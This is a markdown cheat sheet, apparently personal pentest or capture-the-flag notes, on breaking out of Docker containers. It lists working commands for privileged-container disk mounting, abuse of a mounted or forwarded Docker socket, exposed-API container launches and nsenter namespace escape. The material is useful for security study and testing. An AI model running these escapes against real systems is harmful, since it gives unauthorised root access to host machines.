# 🐋 Docker Breakout

## 📚 Resources

- [hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html) - Docker breakout PE
- [excessive-capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities) - Capabilities exploits

### ⛓️‍💥 Tools for breakout

- [deepce.sh](https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh) - script for docker breakout
- [linpeas.sh](http://linpeas.sh)

### 📌 Tips

If you need docker-cli to exploit via socket.

```bash
# docker-cli
apt install docker.io # deb
apk add docker-cli # alpine
```

```bash
# Containers listing (docker API)
curl -s --unix-socket /run/docker.sock http://127.0.0.1:$PORT/containers/json | jq
```

## 🔎 Recon

You can use a tool script to enumerate machine like `linpeas.sh` or `deepce.sh`.

```bash
# search socket
find / -name "*.sock" 2>/dev/null

# capabilities
capsh --print
```

## 💥 Exploit

### Mounted host files `--privileged`

```bash
lsblk -f
fdisk -l
findmnt

mkdir /mnt/host
mount /dev/sdaX /mnt/host
```

### Check `/proc` from host

```bash
ls -l /proc/1/root
```

### Socket

If socket is mounted inside the box, you can use it to execute command from host.

Enumerate others containers with the socket.

```bash
# export to execute command without wrapper
export DOCKER_HOST=unix:///run/docker.sock
```

```bash
# use socket via DOCKER_HOST env
docker ps -a
docker run -v /:/mnt --rm -it alpine sh # enter in host
```

```bash
# run socket to execute command on the host
docker -H unix:///run/docker.sock ps -a
```

#### Via Socket Forwarding

```bash
# Using socket forwarding (ssh, socat)
ssh -L $PWD/docker.sock:/var/run/docker.sock root@vuln.lan

sudo docker -H unix://docker.sock exec -it docker_flag /bin/sh
```

#### Via API

```bash
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

### Namespace escape with `nsenter`

```bash
# Found PID of process from host (sometimes PID 1 is sufficient)
pid=1

# Verified if you have nsenter
nsenter --target $pid --mount --uts --ipc --net --pid /bin/bash
```
